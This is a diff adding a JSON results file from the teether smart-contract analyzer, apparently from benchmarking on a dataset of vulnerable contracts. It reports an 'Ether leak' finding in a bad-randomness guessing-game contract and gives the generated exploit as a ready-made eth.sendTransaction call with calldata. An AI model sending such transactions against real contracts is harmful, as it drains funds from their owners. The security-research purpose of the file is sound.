@@ -1,0 +1,19 @@
+{
+    "errors": [],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x4ba4c16b0000000000000000000000000000000000000000000000000000000000000000\", to:\"0x4000000000000000000000000000000000000000\", value:1000000000000000000, gasPrice:0})"
+            ],
+            "filename": "dataset/bad_randomness/guess_the_random_number.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
